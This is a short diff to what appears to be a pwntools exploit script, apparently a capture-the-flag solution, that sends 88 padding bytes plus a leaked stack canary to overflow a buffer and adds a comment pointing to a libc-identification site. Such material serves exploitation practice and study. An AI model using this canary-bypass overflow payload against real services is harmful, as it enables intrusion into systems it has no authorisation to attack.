@@ -17,3 +17,5 @@ canary = io.recvline().strip()
 info(f"canary = {canary}")
 #send canary in payload
 io.sendline(("A"*88).encode()+p64(int(canary, base=16)))
+
+# Leak libc version: https://libc.blukat.me/
